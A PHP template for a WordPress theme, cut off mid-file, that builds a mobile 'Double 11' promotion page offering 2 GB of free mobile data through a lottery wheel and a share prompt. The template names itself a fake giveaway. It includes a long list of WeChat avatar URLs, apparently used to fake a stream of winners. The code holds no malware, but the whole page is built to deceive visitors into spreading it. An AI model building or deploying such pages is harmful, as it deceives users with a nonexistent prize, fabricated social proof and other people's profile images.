<?php

/*
    template name: 虚假送流量
    description: template for yusi123.com Yusi theme
*/


/**
 * Created by JetBrains PhpStorm.
 * User: 吴文付
 * Date: 15-11-8
 * Time: 上午8:42
 * description:
 */
///////////////////////////////////////////////////////////////////
//                            _ooOoo_                             //
//                           o8888888o                            //
//                           88" . "88                            //
//                           (| ^_^ |)                            //
//                           O\  =  /O                            //
//                        ____/`---'\____                         //
//                      .'  \\|     |//  `.                       //
//                     /  \\|||  :  |||//  \                      //
//                    /  _||||| -:- |||||-  \                     //
//                    |   | \\\  -  /// |   |                     //
//                    | \_|  ''\---/''  |   |                     //
//                    \  .-\__  `-`  ___/-. /                     //
//                  ___`. .'  /--.--\  `. . ___                   //
//                ."" '<  `.___\_<|>_/___.'  >'"".                //
//              | | :  `- \`.;`\ _ /`;.`/ - ` : | |               //
//              \  \ `-.   \_ __\ /__ _/   .-` /  /               //
//        ========`-.____`-.___\_____/___.-`____.-'========       //
//                             `=---='                            //
//        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^      //
//         佛祖保佑       永无BUG        永不修改                    //
////////////////////////////////////////////////////////////////////

?>


<!DOCTYPE HTML>
<html lang="en" data-use-rem>
<head>
    <meta charset="UTF-8">
    <meta content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport">

    <meta itemprop="name" content="喜迎双11送豪礼，2G流量免费领用不完，赶紧来抢啦！">
    <meta itemprop="image"
          content="https://img.alicdn.com/imgextra/i1/373138113/TB29BC8gFXXXXa7XXXXXXXXXXXX_!!373138113.jpg">
    <meta name="description" itemprop="description" content="我已领到2G流量，非常开心你也来一起领取吧，抢到就是赚到！">
    <title>喜迎双11送豪礼，2G流量免费领用不完，赶紧来抢啦！</title>

    <script src="<?php bloginfo('template_url'); ?>/freeflow/jquery-2.js"></script>
    <script type="text/javascript" src="<?php bloginfo('template_url'); ?>/freeflow/lottery.js"></script>
    <script language=Javascript src="<?php bloginfo('template_url'); ?>/freeflow/pc.js" type=text/javascript></script>
    <link rel="stylesheet" href="<?php bloginfo('template_url'); ?>/freeflow/a20150813.3e6f7c2c.lc.css"/>
</head>
<style>
<style>
    * {
    margin: 0;
    padding: 0;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
}

ul {
    list-style-type: none;
}

.clearfix:after {
    content: ".";
    display: block;
    height: 0;
    clear: both;
    visibility: hidden
}

.clearfix {
    *zoom: 1
}

p {
    margin: 0;
}

body {
    background-color: #f4405a;
    font-size: 24px;
    font-family: "Microsoft yahei";
    margin: 0;
}

.wrapper {
    width: 640px;
    background-color: #f4405a;
}

.page {
    width: 100%
}

.w_patr1 {
    background: url(https://img.alicdn.com/imgextra/i1/373138113/TB29BC8gFXXXXa7XXXXXXXXXXXX_!!373138113.jpg) no-repeat;
    height: 540px;
    position: relative;
}

.w_part2 {
    background: url(https://img.alicdn.com/imgextra/i2/373138113/TB2mzuBgFXXXXcOXpXXXXXXXXXX_!!373138113.jpg) no-repeat;
    height: 132px;
    position: relative;
}

.w_part2 .w_czhi {
    width: 378px;
    height: 63px;
    display: inline-block;
    position: absolute;
    top: 10px;
    left: 130px;
}

.w_part3 {
    height: 560px;
    padding-top: 20px;
}

.flash {
    position: relative;
    width: 510px;
    height: 465px;
    margin-left: 62px;
}

#swfcontent {
    width: 510px;
    height: 465px;
    position: relative;
    z-index: 1;
}

#swfcontent-btn {
    display: block;
    position: absolute;
    left: 171px;
    top: 151px;
    z-index: 2;
    width: 175px;
    height: 152px;
}

.w_part3 p.w_fuwu {
    font-size: 20px;
    line-height: 30px;
    height: 30px;
    width: 100%;
    text-align: center;
    padding-top: 10px;
}

.w_part3 p.w_fuwu a {
    color: #fde9c7;
}

.w_part4 {
    height: 500px;
    position: relative;
}

.w_part4 .w_rule {
    width: 510px;
    height: 535px;
    background-color: #c12138;
    margin-left: 62px;
    border-radius: 16px;
    position: relative;
}

.w_part4 p {
    width: 485px;
    color: #fde9c7;
    padding-left: 18px;
    font-size: 22px;
    line-height: 34px;
}

.w_part4 p.w_rulep1 {
    font-size: 32px;
    height: 40px;
    padding: 20px 0 20px 12px;
}

.w_part4 p em {
    width: 36px;
    display: inline-block;
}

.w_star {
    background: url(https://img.alicdn.com/imgextra/i2/373138113/TB2ikG4gFXXXXbyXXXXXXXXXXXX_!!373138113.png) no-repeat;
    width: 63px;
    height: 77px;
    position: absolute;
    z-index: 3;
    right: 33px;
    top: 20px;
}

@-webkit-keyframes twinkling {
        0% {
            opacity: 0;
        }
        50% {
            opacity: 1;
        }
        100% {
            opacity: 0;
        }
    }

.element {
    -webkit-animation: twinkling 3s infinite ease-in-out;
}

.w_tcone {
    width: 389px;
    height: 496px;
    position: relative;
}

.w_tcone .w_guanbi, .w_tctwo .w_guanbi {
    width: 35px;
    height: 35px;
    border-radius: 35px;
    display: inline-block;
    position: absolute;
    right: 0;
    top: 0;
    z-index: 6;
}

.w_num {
    width: 100%;
    height: 56px;
    line-height: 56px;
    color: #fff;
    font-size: 22px;
    padding-top: 73px;
    position: relative;
}

.w_num .w_haoma, .w_yunys .w_haoma {
    width: 160px;
    padding-left: 25px;
}

.w_haoma input {
    width: 160px;
    height: 30px;
    border: none;
    font-size: 22px;
    background: none;
    color: #fff;
}

.w_num span.w_lianxi {
    width: 40px;
    height: 40px;
    display: inline-block;
    position: absolute;
    top: 84px;
    right: 33px;
}

.w_yunys {
    width: 100%;
    height: 56px;
    line-height: 56px;
    color: #dbdcdc;
    font-size: 22px;
    padding-top: 2px;
}

.w_daxiao {
    height: 230px;
    margin-top: 10px;
}

.w_daxiao .w_haoma {
    width: 320px;
    padding-left: 25px;
    color: #fff;
    font-size: 20px;
    height: 30px;
    line-height: 30px;
    padding-top: 16px;
}

.w_daxiao .w_haoma .w_hmspo {
    float: left;
}

.w_daxiao .w_haoma .w_hmspt {
    float: right;
}

.w_daxiao p.w_jiage {
    color: #dbdbdb;
    font-size: 17px;
}

.w_daxiao p.w_jiage span {
    color: #d8c601;
}

.w_daxiao a.w_goumai {
    width: 318px;
    height: 44px;
    border: 1px #eb631d solid;
    color: #9c4306;
    font-size: 28px;
    font-weight: bold;
    border-radius: 12px;
    display: inline-block;
    background-color: #ffea00;
    text-align: center;
    line-height: 42px;
    margin-left: 31px;
    margin-top: 38px;
}

.w_other {
    color: #d9c701;
    font-size: 18px;
    text-align: center;
    padding-top: 30px;
}

.w_other a {
    color: #d9c701;
    font-size: 18px;
}

.w_tctwo {
    width: 380px;
    height: 190px;
    background-color: #dd0931;
    border-radius: 12px;
    position: relative;
}

.w_tctwo .w_num .w_haoma {
    width: 340px;
}

.w_tctwo .w_num .w_haoma .w_xingm {
    width: 136px;
    display: inline-block;
    float: left;
}

.w_tctwo .w_num .w_haoma input {
    background-color: #fff;
    width: 200px;
}

.w_tctnum {
    padding-top: 0;
}

.w_tctwo .w_daxiao {
    height: 150px;
}

.w_tctdiz {
    padding-left: 22px;
    color: #fcece1;
    font-size: 18px;
    line-height: 28px;
}

.w_guanzhu {
    color: #fff;
    font-size: 18px;
    padding-left: 22px;
    padding-top: 12px;
}

.w_guanzhu em {
    width: 18px;
    height: 18px;
    display: inline-block;
}

.w_tctwo a.w_goumai {
    margin-top: 20px;
}

.w_tctwo a.w_guanbi {
    text-decoration: none;
    background-color: #7e060b;
    width: 31px;
    height: 31px;
    border: 2px #fff solid;
    position: absolute;
    right: -14px;
    color: #fff;
    font-size: 34px;
    text-align: center;
    line-height: 30px;
    top: -14px;
    border-radius: 20px;
}

.w_tcthree {
    width: 358px;
    height: 358px;
    text-align: center;
    position: relative;
}

.w_tcthree p.w_chouz {
    color: #ffe48e;
    font-size: 50px;
    font-weight: bold;
    -webkit-text-stroke: 4px #47010e;
    height: 60px;
    line-height: 60px;
    padding-top: 95px;
}

.w_tcthree .w_guanbi {
    position: absolute;
    z-index: 3;
    width: 170px;
    height: 42px;
    border-radius: 12px;
    line-height: 40px;
    display: inline-block;
    color: #fff;
    left: 92px;
    top: 270px;
    background-color: #6a0317;
    text-decoration: none;
}

.w_tcfour {
    width: 379px;
    height: 381px;
    position: relative;
    text-align: center;
}

.w_tcfour p.w_chouz {
    color: #ffe48e;
    font-size: 45px;
    font-weight: bold;
    -webkit-text-stroke: 2px #47010e;
    height: 60px;
    line-height: 60px;
    padding-top: 95px;
}

.w_tcfour .w_guanbi {
    position: absolute;
    z-index: 3;
    width: 170px;
    height: 42px;
    border-radius: 12px;
    line-height: 40px;
    display: inline-block;
    color: #6a0317;
    left: 92px;
    top: 305px;
    background-color: #ffea00;
    text-decoration: none;
}

.w_tcfive {
    width: 365px;
    height: 334px;
    text-align: center;
    position: relative;
}

.w_tcfive p {
    color: #682b03;
    font-size: 34px;
    font-weight: bold;
    padding-top: 45px;
    line-height: 42px;
}

.w_tcfive a.w_guanbi {
    position: absolute;
    width: 160px;
    height: 50px;
    color: #fff;
    background-color: #7a4646;
    line-height: 50px;
    border-radius: 12px;
    top: 164px;
    left: 105px;
    text-decoration: none;
}

.w_tcsix {
    width: 356px;
    height: 313px;
    background-color: #9c182c;
    position: relative;
    text-align: center;
    color: #fff;
}

.w_tcsix p.w_sixpone {
    height: 40px;
    font-size: 34px;
    font-weight: bold;
    line-height: 40px;
    padding-top: 60px;
}

.w_tcsix p.w_sixptwo {
    height: 40px;
    font-size: 28px;
    font-weight: bold;
    line-height: 40px;
    padding-top: 20px;
}

.w_tcsix a.w_guanbi {
    position: absolute;
    width: 150px;
    height: 54px;
    background-color: #ffdfdf;
    border-radius: 12px;
    left: 104px;
    top: 202px;
    color: #4e020e;
    font-size: 30px;
    font-weight: bold;
    text-decoration: none;
    line-height: 50px;
}

.sam_tcbbbox {
    background: rgba(0, 0, 0, .8);
    position: fixed;
    left: 0;
    top: 0;
    bottom: 0;
    right: 0;
    z-index: 99;
    display: none;
}

body .sam_tcbb {
    position: absolute;
    left: 50%;
    top: 50%;
    -webkit-transform: translate(-50%, -50%);
    transform: translate(-50%, -50%);
    z-index: 9;
}

.w_input {
    width: 18px;
    height: 18px;
    float: left;
}

.w_gzdiv {
    position: absolute;
    top: 220px;
    left: 16px;
    color: #fff;
    font-size: 17px;
    text-align: left;
    width: 340px;
}

.w_gzdivtwo {
    top: 248px;
    left: 30px;
}
</style>



<!--<div class="bdsharebuttonbox" style="display: none"><a href="#" class="bds_more" data-cmd="more"></a><a href="#" id="qqshare" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a><a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网"></a><a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a></div>-->
<!--<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>-->

<body>

<img id="qqshare" onclick="closeimg()" src="<?php bloginfo('template_url'); ?>/freeflow/share.jpg" alt="" style="display:none;position:absolute;left: 0px;right: 0px;width:100%;height:100%;z-index: 1000000;opacity: 50">

<div style="width: 0px;height: 0px;overflow: hidden;">

</div>
<div style="display: none">
    <img src="https://img.alicdn.com/imgextra/i1/373138113/TB29BC8gFXXXXa7XXXXXXXXXXXX_!!373138113.jpg" alt="" style="width: 0;height: 0"/>

</div>

<div style="display: none">
    <audio id="b1" controls>
        <source src="<?php bloginfo('template_url'); ?>/freeflow/yinyue.mp3" type="audio/mpeg">
    </audio>
    <script>
        var myVideob1 = document.getElementById("b1");

        function playVid() {
            myVideob1.play();
        }
    </script>
</div>
<div style="width: 0px;height: 0px;overflow: hidden;">

  </div>
<div class="wrapper">
    <div class="pages">
        <section class="page page1">
            <div class="inner">
                <div class="w_patr1"></div>
                <div class="w_part2">
                    <!--<a id="chongzhi" class="w_czhi"></a>-->
                </div>
                <div class="w_part3">
                    <div class="flash">
                        <div id="swfcontent">

                            <!--choujiangzhuanpan-->
                            <style type="text/css">
                                #lottery {
                                    width: 100%;
                                    height: 100%;
                                }

                                #lottery table td {
                                    width: 166px;
                                    height: 152px;
                                    text-align: center;
                                    vertical-align: middle;
                                    font-size: 24px;
                                    color: #333;
                                    font-index: -999;
                                    border-radius: 5px;
                                    display: inline-block;
                                }

                                #lottery table td img {
                                    border-radius: 5px;
                                }

                                #lottery table td a {
                                    width: 166px;
                                    height: 152px;
                                    line-height: 155px;
                                    display: block;
                                    text-decoration: none;
                                }
                                #lottery table td.active {
                                    background-color: white;
                                }

                                #demo {
                                    width: 300px;
                                    margin: 50px auto 10px;
                                    overflow: hidden;
                                }

                                #demo a {
                                    float: left;
                                    width: 90px;
                                    height: 30px;
                                    line-height: 30px;
                                    text-align: center;
                                    margin-left: 10px;
                                    background-color: #000;
                                    color: #fff;
                                    text-decoration: none;
                                    font-weight: bold;
                                }

                                #demo a.cur {
                                    background-color: #933;
                                }
                            </style>
                            <div style="width: 0px;height: 0px;overflow: hidden;">
                                </div>

                            <div id="lottery">
                                <table border="0" cellpadding="0" cellspacing="0">
                                    <tr class="lottery-group">
                                        <td class="lottery-unit td_1 active" ><img src="https://img.alicdn.com/imgextra/i1/373138113/TB2W6O.gFXXXXacXXXXXXXXXXXX_!!373138113.png"/></td>
                                        <td class="lottery-unit td_2" style="margin:0 5px"><img src="https://img.alicdn.com/imgextra/i1/373138113/TB2sHy6gFXXXXbhXXXXXXXXXXXX_!!373138113.png"/></td>
                                        <td class="lottery-unit td_3"><img src="https://img.alicdn.com/imgextra/i2/373138113/TB2C.uIgFXXXXXSXpXXXXXXXXXX_!!373138113.png"/></td>
                                    </tr>
                                    <div style="width: 0px;height: 0px;overflow: hidden;">
                                      </div>

                                    <tr class="lottery-group" >
                                        <td class="lottery-unit td_4" style="margin: 4px 0"><img src="https://img.alicdn.com/imgextra/i3/373138113/TB2sgKBgFXXXXbWXpXXXXXXXXXX_!!373138113.png"/></td>
                                        <td class="td_5" style="margin:0 5px"><a href="javascript:;"><img src="https://img.alicdn.com/imgextra/i1/373138113/TB2ila2gFXXXXb6XXXXXXXXXXXX_!!373138113.png"/></a></td>
                                        <td class="lottery-unit td_6"><img src="https://img.alicdn.com/imgextra/i3/373138113/TB23FW8gFXXXXa8XXXXXXXXXXXX_!!373138113.png"/></td>
                                    </tr>
                                    <tr class="lottery-group">
                                        <td class="lottery-unit td_7"><img src="https://img.alicdn.com/imgextra/i1/373138113/TB2FraQgFXXXXajXpXXXXXXXXXX_!!373138113.png"/></td>
                                        <td class="lottery-unit td_8" style="margin:0 5px"><img src="https://img.alicdn.com/imgextra/i1/373138113/TB2T9yNgFXXXXa.XpXXXXXXXXXX_!!373138113.png"/></td>
                                        <td class="lottery-unit td_9"><img src="https://img.alicdn.com/imgextra/i2/373138113/TB2_SC2gFXXXXb0XXXXXXXXXXXX_!!373138113.png"/></td>
                                    </tr>
                                </table>
                            </div>
                            <script type="text/javascript">
                                window.onload = function () {
                                    lottery.lottery({
                                        selector: '#lottery',
                                        width: 3,
                                        height: 3,
                                        index: 0,
                                        initSpeed: 500
                                    });
                                }
                            </script>
                            <!--！choujiangzhuanpan-->
                        </div>
                    </div>
                </div>
                <div class="w_part4">
                    <div class="w_rule">
                        <div style="width: 0px;height: 0px;overflow: hidden;">
                         </div>
                        <div class="w_star element"></div>
                        <p class="w_rulep1">【活动规则】</p>

                        <img src="https://img.alicdn.com/imgextra/i1/373138113/TB2Oc5FgFXXXXcuXpXXXXXXXXXX_!!373138113.jpg" alt="" style="width: 100%"/>

                    </div>
                </div>
            </div>
        </section>
    </div>
</div>
<script type="text/javascript">
    //shipei_screen
    function adaptVP(a) {
        function c() {
            var c, d;
            return b.uWidth = a.uWidth ? a.uWidth : 640, b.dWidth = a.dWidth ? a.dWidth : window.screen.width || window.screen.availWidth, b.ratio = window.devicePixelRatio ? window.devicePixelRatio : 1, b.userAgent = navigator.userAgent, b.bConsole = a.bConsole ? a.bConsole : !1, a.mode ? (b.mode = a.mode, void 0) : (c = b.userAgent.match(/Android/i), c && (b.mode = "android-2.2", d = b.userAgent.match(/Android\s(\d+.\d+)/i), d && (d = parseFloat(d[1])), 2.2 == d || 2.3 == d ? b.mode = "android-2.2" : 4.4 > d ? b.mode = "android-dpi" : d >= 4.4 && (b.mode = b.dWidth > b.uWidth ? "android-dpi" : "android-scale")), void 0)
        }

        function d() {
            var e, f, g, h, c = "", d = !1;
            switch (b.mode) {
                case"apple":
                    f = (window.screen.availWidth * b.ratio / b.uWidth) / b.ratio;
                    c = "width=" + b.uWidth + ",initial-scale=" + f + ",minimum-scale=" + f + ",maximum-scale=" + f + ",user-scalable=no";
                    break;
                case"android-2.2":
                    a.dWidth || (b.dWidth = 2 == b.ratio ? 720 : 1.5 == b.ratio ? 480 : 1 == b.ratio ? 320 : .75 == b.ratio ? 240 : 480), e = window.screen.width || window.screen.availWidth, 320 == e ? b.dWidth = b.ratio * e : 640 > e && (b.dWidth = e), b.mode = "android-dpi", d = !0;
                case"android-dpi":
                    f = 160 * b.uWidth / b.dWidth * b.ratio, c = "target-densitydpi=" + f + ", width=" + b.uWidth + ", user-scalable=no", d && (b.mode = "android-2.2");
                    break;
                case"android-scale":
                    c = "width=" + b.uWidth + ", user-scalable=no"
            }
            g = document.querySelector("meta[name='viewport']") || document.createElement("meta"), g.name = "viewport", g.content = c, h = document.getElementsByTagName("head"), h.length > 0 && h[0].appendChild(g)
        }

        function e() {
            var a = "";
            for (key in b)a += key + ": " + b[key] + "; ";
            alert(a)
        }

        if (a) {
            var b = {uWidth: 0, dWidth: 0, ratio: 1, mode: "apple", userAgent: null, bConsole: !1};
            c(), d(), b.bConsole && e()
        }
    }
    ;
    adaptVP({uWidth: 640});
</script>


<script>
    $(document).ready(function () {

        var i=0;
        $('#box-item0').show();
        setInterval(function(){
            i++;
            $('#box-item'+i).show();
            $('#box-item'+(i-1)).hide();
            if(i==11){
                i=0;
            }
        },4000)

    })
</script>


<script>
var gundong_touxiang = new Array(
    'http://wx.qlogo.cn/mmopen/PiajxSqBRaEKfv6SwrzPVicSvwPdl8ZP6Tx01koxSuTib7b7kNb27tZyicXufMx6EP8p0ejf7KibgrvZ37ib0l7rdstg/96',
    'http://wx.qlogo.cn/mmopen/ajNVdqHZLLBZ0q8N3wBlQj6QibMRSgkHT3K0nribHBiaMw3888l5fqOcGJskibvCGgjYq5iaHFpW0pqsvOjUHdbsd6A/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ74783FdxdedSadeKOpxeCGqkKvH4KicP8ibvexd4QcYZI8yGzXNAQ5iaIU0sgFRkReDVibkrZiaS6K86qm0rhZZp5aj/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHY8Pvxstm5oKibPL8FNJY3N2G0FqOKqibwia4AYgAKGsNjGcOZ73WkE0iasJ06sHHoYcNoLUkR7x0dicyEZgGrKEFh39/96',
    'http://wx.qlogo.cn/mmopen/dibCvqHg4WneiaicfkPHjkZFiccS3dsC5pXj67viafXMqRYxjmfBiaYl2lgicibJgzRBzXEWMAFnJ8W08tHr66xqGYCmSN4RJic6Zm360/96',
    'http://wx.qlogo.cn/mmopen/dibCvqHg4Wnc1W5krR5JOQ50AgF4lASm4hgoxMcEvpicqiau6jTpYMCxRI2I3WJ3fhb1f8bguDIUbd0xSH0ribnArGf5amuWZvcb/96',
    'http://wx.qlogo.cn/mmopen/NFG2UYeaAliblvkzfl2CL6lhP5f1Z6U10J0ShSUAyTCHz21AngN1U87qwHoOGpu2m5gqV5ylW4VYDzuRziaIjNUUlvSfibIqHicF/96',
    'http://wx.qlogo.cn/mmopen/NFG2UYeaAlicQmGO8X1VZcgApJ9yyKsvfPcsjw8WcbkAWYZ2JhFQ9mObJBkl78DE5xV4OC0Nd7Fn50JJqKicbbwFib8ymBkY4W7/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ4UTtWQeZ560bOoAyZwpGBVeDpB2z6M2SBxPSKhkqwfOzcWKtjZmZbSpVfunm1vILo1aaWkyoFbXfAVib0FaUWRW/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ5US8J1QRBsuIAFC8mWlSErASK63iaNXZylowD5APib1kUbU0VT17n0Ggr6377nibT6uYJg9OHJqic0NkNZwpzR74gd/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHaPNhVIAr51r8G7SsJo0ZLz0LkHPxEMlU6UvefQJLqS4wibz1Dictic00JqJpsLLNpeoRA2XFSKMHHbU15Zibln8fRY/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHY8Pvxstm5oK10xmHXIU9sXLEhJkaEx4AZFNK4WOaQl7ZLwgic4YnfbCTQRiaEicCZPf9I1eAmKM1AvQKGG5Lm9tgp/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ74783FdxdedYlarCiapPsxTg1QZEXmkvvfKnq3yWuySXFkDWWnZDCYjibYiapOHEh340oaNicdJTOtxoIyPveWdOpP/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHYK8eb41v0IGkvKXAmGsE6odcdeywIRqOu8uUhmYwrqfr3NAae3uxz0JosSeTMD3MWzLr21iaQ9wwEJVKG007Vul/96',
    'http://wx.qlogo.cn/mmopen/dibCvqHg4WneiaicfkPHjkZF05CNcXZhWicTctgiczlicBUiciculDEChAgMkEWtNPVCRCoSX4KFT1NgvyDnrseSd6Dr6blW72GGFqAz/96',
    'http://wx.qlogo.cn/mmopen/PiajxSqBRaEJqIowicRftlHvu2bw6sBwUsr27F0PQb8ic1MGodrFQ3DtMWCibJPuJMzSaSA7vwkjrCmdKmgnRZ6Lhw/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ74783FdxdedYjia67IXpp74nS3XaF5QJpibOmDbtHuM24ywypBTb3FILcZy0Dbb17lJBaQC6puZQMpYBiarnuFDZM/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHY8Pvxstm5oK2ttEyZvJtlUrs7J8PYQ13iaU8u8JgIQjVuibFGRgodXeduRYDAZkibf6tLwmEZYpKNRKBbRrPobevN/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHY8Pvxstm5oK4ibwOtxXGc9toTiaUonicv0JrJia3rRNVg3PU52QRic9IPQe36b8TdO5jicuaXA5EBMGAE1bBBEbhFTCu/96',
    'http://wx.qlogo.cn/mmopen/NFG2UYeaAl8MBVSYQJmrqCpjFpuqkYnpMjIribMAqh7zRIQZiaGnfq8DWDnQzKibPHhwyQoPNBoHuicw10Y15LgRHmc4HaoibicF5m/96',
    'http://wx.qlogo.cn/mmopen/NFG2UYeaAlicQmGO8X1VZcoR4s77VqzjMeuaZcR2PRguk2p8jJ0dLN4SBVUyJJVyYI9I6oocvTGI5kek7frNRTsc92aUvxj50/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHY8Pvxstm5oK9yPIcWSh33nBWWJ7M4X9LJg6LJcpfTWibGb3ric5FyiaAibceMia7eqSib7veIP1aLKX3llPpkLJyCzp1/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHbreWKlnyuXusXEtHzAwU2pmcUzTfGZfHqhW3KxPUZuuJczzaXtAoot0cK8gjkmIbjO6BPsU9GuDXqNwPGwZxicr/96',
    'http://wx.qlogo.cn/mmopen/NFG2UYeaAlicQmGO8X1VZcovIGsrTbHJ9HkHjhYDTfslQnZz0PZEoqV2agacTNt1BVU6LpM2M8nTUHvv2xdZjXXhQiawcOKNQl/96',
    'http://wx.qlogo.cn/mmopen/NFG2UYeaAlicI73wnUqwQvJklhW0jIEd33QZvGIf7emPyz8gvtuEswic6cXzas2Wf4TGhVJXgp7qEJFicEY4qOWjj41wyfSH4Y0/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ7td6pBSHctzbSbeWBGHqlibcsOrBJIyxwpn0lEgRLaTZSAMGEPib5K1EzrY0OyibKTIEB5FfkGRba270HXKghytKic/96',
    'http://wx.qlogo.cn/mmopen/dibCvqHg4WnelE8icwdWXlYEGrwWF6lnWaLmH9heCib0ANdDfxBcSbrDFtZGUBkKOUqU00ibtOicnponGcpicIAHicnpw/96',
    'http://wx.qlogo.cn/mmopen/NFG2UYeaAl8U517fsqdraDP9iaCqicE6I80wFeMBDohZBiaC9kEfvSFibr6TpYNkrH9336kJngKSCLwb4dicTYgLTg9cPicyicbOB7ia/96',
    'http://wx.qlogo.cn/mmopen/LBrOAQmYlluYQA4fM1sbDpPeklDoUl1xx2Qj2T38CS2FY5GVyZZ48cBG4ubcGPvKLoT7IesW0hpt7IXV5GKm9Vus4elmcFicR/96',
    'http://wx.qlogo.cn/mmopen/dibCvqHg4WncOnjBU8bHibicicYicvniazgl1nhenHlfKRYmg6kVkNRWvCg2sAav0bq40Pl0NQ7qNEAnttafricIb3Xlqs7fSTviaLEo/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ5x0XyoPBKXpSMicOnCaia4yHPvFTIPeaj10ic5fLpxqDE6ZibNcEYJ2qicfWLN0I5bMODtVibzmVc7vq5biaNRpVzbznv/96',
    'http://wx.qlogo.cn/mmopen/dibCvqHg4WnfHHsYtGMllwcMcPcSsEZnyfvOzSeNEibasNJHhH1Qia2ZDEhWib8dNbImZnZGFLb9Z1g9OXSY8J11s6Qq70BpnSoo/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHY8Pvxstm5oKiccFkKufc710TSia6u98jKSOelW0X3u2HSgzNTCGia6UicwQpVD6jXngBkuBItFThlZk87cx7ibHqTqW/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHY8Pvxstm5oK8lvicArHZUiabgFfkcT0Ua1bzM3KsN0awqaTrKQib8Gndpn1ibx5fsiaAfmAicmv82YGogoDBbNqJaibzG/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ5Qjkwx80T1U7BFeuGzn3Z0JJ7W7sFnY6icjCLANVRIeI0k4UZTKccGHnKu4ypHCFQY6050YC2hSjy3PibRUvl9G1/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ74783FdxdedcpaVOXYkha8vF9p7YvS03E09QbZQxTRTokQ6lfrgZD2Cm0NxdzjPwLKo7nb23I3L1jcOypNkzq4/96',
    'http://wx.qlogo.cn/mmopen/CpCibtib23t5DsyRo8hHuxb9TpICvgS8UB9FQicic2mjacpxIjc17js6WhmLNnWTibibW3mCMqj3GakULnEjPNeTvrG2K9mzOM6OEq/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ74783FdxdedX4sykRv7TAgylicAadymu6aPYV8k5hibRhvHjKv2hhtNEzE6ZbML6LmoulgbnvCSzqf8BMvRXODN8/96',
    'http://wx.qlogo.cn/mmopen/ajNVdqHZLLD7107Biackz45xD0tOT5EIhsyicc9uK9nFd0otQoKUcIMXysqyJ4EMKOSRicVuYOCY0eGk6W3n6keSJrLSzXjhy8am5dPT3yQpnk/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ4OibfqPuoeDMGl8KflcXgUeK6yCH00oeSMrbYXpyBPICwNDuvA0DIzswibb8gD0v0IhnXDZOwu0EzzbnjrI4uzibQ/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ6q2l4332xf9vwcxYTFSUVFWpicIDicIPNTzjmkicmgibw5XsLcLMVKS3EwUrYuiakMEslGUUhibjibzlI2xm4TurL0q9u/96',
    'http://wx.qlogo.cn/mmopen/CpCibtib23t5CicZFK9jGz9cLrCbL4JNBc7TPs0OasS411m6OVbkM3NU8yd5CXtxicdsTjfTvkabw7nhGZE99vLnHxw821xpEBvb/96',
    'http://wx.qlogo.cn/mmopen/NFG2UYeaAlicQmGO8X1VZctvGQtXkl6iavd4hG9uJ5yayzMh8YKoR24DZGNY2xyXu2mRaRCUL49FUiaRsYe10z4crQmeBS4icWyS/96',
    'http://wx.qlogo.cn/mmopen/NFG2UYeaAl9Px1zpjkpH8q23d4GqwV2ficcyMORJjkwoYERasgXtvTmDicibtDBItQeQ89ibQBkA5JN4O8TibbsVVw0IvNSrnRfOK/96',
    'http://wx.qlogo.cn/mmopen/NFG2UYeaAlicQmGO8X1VZcurs6t5Os1dG5BzViaUhvj5LZIgy57Fsjy8icfZvkv8Q8hHVJGFRxnksicxlLQ9D2h1QTLmTyTZmU5E/96',
    'http://wx.qlogo.cn/mmopen/PiajxSqBRaEKfv6SwrzPVicSvwPdl8ZP6Tx01koxSuTib7b7kNb27tZyicXufMx6EP8p0ejf7KibgrvZ37ib0l7rdstg/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHZQmicSeZiayv4iacRywULiaVM9r8Dymvc8ia4ESBBTwT9ZZyu4ViaNLczcoBUyv2auNMhhxhZmib0zt6dlKXUMwhchhL2/96',
    'http://wx.qlogo.cn/mmopen/dibCvqHg4WneiaicfkPHjkZFiccS3dsC5pXj67viafXMqRYxjmfBiaYl2lgicibJgzRBzXEWMAFnJ8W08tHr66xqGYCmSN4RJic6Zm360/96',
    'http://wx.qlogo.cn/mmopen/icz582VuVOHY8Pvxstm5oK6dJv6Eic0kpbaW3YxGib2hVZnFnoQWouqehnQ3zSg15KicdqdI6DMdiaibA3ANQ5U4fXDFiaXl3wZNQA1/96',
    'http://wx.qlogo.cn/mmopen/sv0wha7haJ74783FdxdedSadeKOpxeCGqkKvH4KicP8ibvexd4QcYZI8yGzXNAQ5iaIU0sgFRkReDVibkrZiaS6K86qm0rhZZp5aj/96',
